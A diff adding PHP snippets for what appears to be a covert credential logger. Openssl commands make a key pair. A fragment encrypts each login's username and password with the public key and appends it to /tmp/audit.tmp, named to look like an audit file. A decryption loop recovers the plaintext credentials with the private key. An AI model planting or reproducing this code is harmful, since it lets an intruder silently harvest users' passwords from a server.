@@ -1,0 +1,37 @@
+//openssl genrsa -out private.key 2048
+//openssl rsa -in private.key -out public.pem -outform PEM -pubout
+
+//encode pub key
+<?php
+	$key = "-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArMV7sztGnecvs6vKzor1
+50d5CuF6pdGtWRK9X755mmDfSdsT3tbPedwzwQAKUROwOSKkL14OFPo6UMKWPerz
+L6kftC1q0Zd1ZgO6BWtooHa76AmD7tpeXkptdYXUaDp5HmkkQJmXP6GxJvb9h9qb
+8EglhVjPvrGEVUEyisJZn/4fSQnW8JKsj2Tb9tyjyoPaJ8dypoI9mdAX7FogZ1pO
+3T3QNeaXIbFvuo951WZB8cwgyIs21GyaiBPf/hWtJYRyiXXp8qR3m+GBvUZZ+zoq
+Ertk+rgjuT3poYbuDvQj5lTQJgHPFDxVS4X+v/sdRYIA1UgrF5a5IUoLETvcEkA8
+kQIDAQAB
+-----END PUBLIC KEY-----";
+	$encodedkey = base64_encode($key);
+	echo $encodedkey;
+?>
+
+//store username and password
+$auditkey = "<insert b64encoded pubkey>";
+openssl_public_encrypt($username . ":" . $password, $encrypted, base64_decode($auditkey));
+file_put_contents("/tmp/audit.tmp",base64_encode($encrypted) . PHP_EOL,FILE_APPEND);
+
+//dec
+<?php
+$privatekeyfile = "<filepath>/private.key";
+$targetfile = "<filepath>/enc.txt";
+$private_key = openssl_pkey_get_private(file_get_contents($privatekeyfile));
+$fn = fopen($targetfile,"r");
+while(! feof($fn))  {
+	$encdata= base64_decode(fgets($fn));
+	openssl_private_decrypt($encdata, $decrypted, $private_key);
+	echo "decrypted: " . $decrypted . PHP_EOL;
+	echo "error: " . openssl_error_string() . PHP_EOL;
+}
+fclose($fn);
+?>
